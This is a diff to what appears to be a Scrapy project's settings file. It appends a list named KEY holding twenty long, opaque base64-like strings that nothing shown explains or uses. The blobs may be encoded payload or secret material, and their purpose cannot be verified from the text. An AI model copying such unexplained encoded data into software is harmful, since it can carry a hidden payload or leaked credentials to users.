@@ -101,3 +101,25 @@ URLLENGTH_LIMIT = 0
 
 # Set settings whose default value is deprecated to a future-proof value
 FEED_EXPORT_ENCODING = "utf-8"
+KEY =[
+    "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",
+]
